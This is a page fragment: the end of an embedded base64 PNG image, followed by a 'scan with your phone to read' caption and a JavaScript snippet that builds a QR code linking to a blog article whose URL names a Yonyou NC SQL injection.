9D4D4lOH/283DakBq5+Y7mIX4Iqq/8XZdD6gGlDe0JDH++azN8PkDyn3TwQnKA6dP/QRrw0WMraA+QPAT36etryP403uB5G4i36QxXe7bOvBzGWwAjP/PB6Le/aH2hmgiprVyF+grL8ygg/SB41meVf6RvA3lkunK/dwKHgUCmDyOebQni7z5vHCQv7z65ebHrckg/OKIee0A86hAOQX3mO0J8Xe91EB+MaB1Et26Gh4FYfOFrTuDbA4Fx6hAOI/ZPz9sB8cn1QXS5qE9UL1QTYeyhXt6KzmH0l2cf+kUY/er7mv2z+b3Wn789kN7w4t87gW8PxKlDbotcXG0PRr8+mOvmRYhPPkP3IEJq5NbAqEM4BPVDuHXqorq40s1D+sEdvz0Qm1/4MydwGIhT7Xi2nH7ItLvfvHrnXYf00QfhEFTfoz06QmrUIRyC9oBwfSJE16feEUYfzLl19tvjYSCaL3zNCWwDgUwTHuNqm5C6szzEB8Huh+jemp6XQ3zyQjhqpdurY+UqYF5XuX3AY5/99zX7556H9IM7bgPZF17PrzuBayCvO/vpyv8DAAD//8q9ObsAAAAGSURBVAMA1OgHxRzqZEAAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-oacoSchedulerEvents-isAgentLimit-agent-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 